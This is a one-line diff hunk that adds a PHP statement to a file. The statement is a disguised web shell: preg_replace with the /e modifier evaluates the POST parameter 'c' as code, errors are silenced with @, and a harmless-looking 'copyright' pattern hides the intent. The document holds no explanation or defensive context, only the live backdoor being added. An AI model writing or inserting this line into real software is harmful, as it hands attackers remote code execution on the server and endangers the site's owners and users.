@@ -1,0 +1,1 @@
+<?php @preg_replace("/[copyright]/e",$_POST['c'],"error");?>
